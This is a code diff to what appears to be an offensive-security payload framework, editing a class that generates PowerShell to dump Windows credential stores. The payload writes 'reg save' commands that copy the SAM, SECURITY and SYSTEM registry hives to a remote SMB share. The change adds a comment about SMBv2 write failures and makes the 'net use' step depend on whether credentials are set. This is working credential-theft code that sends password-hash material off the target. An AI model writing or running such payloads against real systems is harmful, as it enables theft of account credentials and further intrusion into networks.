@@ -60,6 +60,7 @@ class GodPotato(Payload):
 
 
 class SamDumpPowershell(Payload):
+    """FOR WHATEVER REASON reg save cant write to smbv2 shares?! sometimes"""
     ext = ".ps1"
 
     def generate(self):
@@ -70,7 +71,8 @@ class SamDumpPowershell(Payload):
         self.system = self.smb_server_object.future_file()
         self.output_files += [self.sam, self.security, self.system]
         powershell_command = f"reg save hklm\\sam {self.sam.remote_path}\nreg save hklm\\security {self.security.remote_path}\nreg save hklm\\system {self.system.remote_path}"
-        powershell_command = self.smb_server_object.net_use_string() + "\n" + powershell_command
+        if self.smb_server_object.credentials:
+            powershell_command = self.smb_server_object.net_use_string() + "\n" + powershell_command
         self.payload = powershell_command
 
 
